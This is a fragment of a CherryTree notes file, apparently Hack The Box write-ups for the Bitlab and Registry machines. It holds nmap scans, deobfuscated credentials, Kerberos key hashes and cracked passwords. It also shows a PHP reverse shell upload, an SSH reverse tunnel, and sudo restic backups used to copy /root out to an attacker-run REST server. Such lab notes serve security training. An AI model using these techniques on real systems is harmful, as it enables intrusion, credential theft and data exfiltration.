+EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
+EXCH01$:des-cbc-md5:8c45f44c16975129
+                </rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Bitlab" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1577009557.84" ts_lastsave="1577299450.57" unique_id="44">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1577009581.45" ts_lastsave="1577059914.01" unique_id="45">
+			<rich_text>Ports:
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
+|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
+|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
+80/tcp open  http    nginx
+| http-robots.txt: 55 disallowed entries (15 shown)
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
+|_/s/ /snippets/new /snippets/*/edit
+| http-title: Sign in \xC2\xB7 GitLab
+|_Requested resource was </rich_text>
+			<rich_text link="webs http://10.10.10.114/users/sign_in">http://10.10.10.114/users/sign_in</rich_text>
+			<rich_text>
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+- Go to help directory and under bookmarks.html source code we have to de-obfuscate the following string to get the username and password:-
+   → javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
+   
+   → De-obfuscation leads to “user_login: “clave” &amp; “user_password”: “11des0081x”
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1577059920.99" ts_lastsave="1577060133.88" unique_id="46">
+			<rich_text>- Once we login we see that in snippets directory there is an incomplete postgres connection script written.
+- We complete the script as :
+   → psql.php
+            &lt;?php
+    $db_connection = pg_connect(&quot;host=localhost dbname=profiles user=profiles password=profiles&quot;);
+    $result = pg_query($db_connection, &quot;SELECT * FROM profiles&quot;);
+    echo &quot;$result&quot;;
+    while ($row = pg_fetch_row($result)) {
+      echo &quot;$row[0] $row[1] $row[2]\n&quot;;
+    }
+
+    ?&gt;
+- When we execute the file as /profile/psql.php we see the details of clave user.
+   → clave : c3NoLXN0cjBuZy1wQHNz== [ no need to b64decode. It is a troll]
+- We can read the user file.</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1577137349.47" ts_lastsave="1577299464.56" unique_id="47">
+			<rich_text>- Run the windows VM and install ollydbg.exe
+- Put the file ollyddbg and run it. After sometime we will find the command as :-
+   → ssh root@gitlab.htb -pw “Qf7]8YSV.wDNF*[7d?j&amp;eD4^”
+- Root hash :- 8d4cc131757957cb68d9a0cddccd587c</rich_text>
+		</node>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Registry" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1577299450.57" ts_lastsave="1577363134.42" unique_id="48">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Interesting" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1577300406.67" ts_lastsave="1577358925.47" unique_id="49">
+			<rich_text>PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
+|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
+|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
+80/tcp  open  http     nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+| ssl-cert: Subject: commonName=docker.registry.htb
+| Not valid before: 2019-05-06T21:14:35
+|_Not valid after:  2029-05-03T21:14:35
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+DirSearch :- /bolt/bolt
+
+gzip file data downloaded and extracted from dir - /install
+
+docker registry found with docker.registry,htb/v2 with creds admin:admin
+
+Put the certificate ca.crt in /usr/local/share/ca-certificates and service restart docker to get the login working.
+Run </rich_text>
+			<rich_text link="webs https://docker.registry.htb/v2/_catalog">https://docker.registry.htb/v2/_catalog</rich_text>
+			<rich_text> to find out the image as bolt-image.
+Use docker pull docker.registry.htb/bolt-image to pull the image
+
+run the docker container with image name as docker run -dit image-name
+and then docker ps -a  &amp; docker exec -it conatiner bash
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="User" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1577358931.48" ts_lastsave="1577358982.35" unique_id="50">
+			<rich_text>Since the password on the private key doesn't crack we start looking in docker manifest by first doing :-
+   docker manifest inspect docker.registry.htb/bolt-image and then going to the web :- </rich_text>
+			<rich_text link="webs https://docker.registry.htb/v2/bolt-image/manifests/latest">https://docker.registry.htb/v2/bolt-image/manifests/latest</rich_text>
+			<rich_text>
+   
+Now we download all the blob files and unzip them to get the passphrase.
+
+We list the blobs :-
+{
+         &quot;blobSum&quot;: &quot;sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&quot;
+      },
+      {
+         &quot;blobSum&quot;: &quot;sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee&quot;
+      },
+      {
+         &quot;blobSum&quot;: &quot;sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c&quot;
+      },
+      {
+         &quot;blobSum&quot;: &quot;sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7&quot;
+      },
+      {
+         &quot;blobSum&quot;: &quot;sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791&quot;
+      },
+      {
+         &quot;blobSum&quot;: &quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&quot;
+      },
+      {
+         &quot;blobSum&quot;: &quot;sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0&quot;
+      },
+      {
+         &quot;blobSum&quot;: &quot;sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a&quot;
+      },
+      {
+         &quot;blobSum&quot;: &quot;sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797&quot;
+      },
+      {
+         &quot;blobSum&quot;: &quot;sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff&quot;
+      }
+   ],
+
+And then going to the endpoint /v2/bolt-image/blobs/&lt;digest&gt;
+We download the first blob and unzip it to get the passphrase.
+
+Details of blob :- 
+etc/0040755000000000000000000000000013472256035010032 5ustar0000000000000000etc/profile.d/0040755000000000000000000000000013472256264011720 5ustar0000000000000000etc/profile.d/01-ssh.sh0100755000000000000000000000033613472067523013267 0ustar0000000000000000#!/usr/bin/expect -f
+#eval `ssh-agent -s`
+spawn ssh-add /root/.ssh/id_rsa
+expect &quot;Enter passphrase for /root/.ssh/id_rsa:&quot;
+send &quot;GkOcz221Ftb3ugog\n&quot;;
+expect &quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&quot;
+interact
+etc/profile.d/.wh.02-ssh.sh0000600000000000000000000000000013472256232013730 0ustar0000000000000000
+
+Passphrase:- GkOcz221Ftb3ugog   
+
+Now we ran read the user file</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1577363134.43" ts_lastsave="1577403673.98" unique_id="51">
+			<rich_text>- After getting user we navigate to /var/www/html/app/database and copy the bolt.db file to local using the scp tool.
+- Next we open the db file in sqlitebrowser and we see that the admin password is there.
+- We run the admin hash with rockyou using jTR and get the password as “strawberry”
+- We can use that to login to the webportal.
+- Now we edit the accept_file_types in Main Configuration of Bolt admin portal to accept php as well.
+- We upload the php-rev-shell.php and got a reverse shell but the box doesn't send the connections outside of the box. 
+    So we set up a nc listener in localhost[ bolt ] using ssh session. 
+- We ran sudo -l and found out about restic command to run. 
+- We see that we can provide rest http api backend url to backup any file content on the host with sudo privs.
+- So , we setup restic rest-server in our local and ssh tunnel the localport to the remote with this command
+   → Starting Rest-Server : 
+      ⇒ rest-server --no-auth
+   → Setup Remote port ssh tunnel:
+      ⇒ ssh -i id_rsa -N -f -R 8000:127.0.0.1:8000 bolt@10.10.10.159 
+- Then we ran restic init --repo /tmp/restic to setup a repo in which the data to be copied. We provide the password as well
+- In the www-data shell we issue the followin command:-
+   → sudo /usr/bin/restic backup -r rest:</rich_text>
+			<rich_text link="webs http://127.0.0.1:8000">http://127.0.0.1:8000</rich_text>
+			<rich_text> /root and get the output as 
+              ⇒ found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
+                  scan [/root]
+                  scanned 10 directories, 14 files in 0:00
+                  [0:01] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00 
+                  duration: 0:01
+                  snapshot df8adf12 saved
+- The above command will copy the /root directory in the mentioned repo url and will create a snaphot which can be listed using :
+   → restic -r rest:</rich_text>
+			<rich_text link="webs http://127.0.0.1:8000/">http://127.0.0.1:8000/</rich_text>
+			<rich_text> snapshots
+- Then we use the id of the snapshot to restore the backup:-
+   → restic -r rest:</rich_text>
+			<rich_text link="webs http://127.0.0.1:8000">http://127.0.0.1:8000</rich_text>
+			<rich_text> restore df8adf12 --target /dev/shm
+- And we can read the flag as well as read the ssh keys to login.
+
+Root Hash:- ntrkzgnkotaxyju0ntrinda4yzbkztgw
+
+
+
+</rich_text>
+		</node>
+	</node>
+</cherrytree>
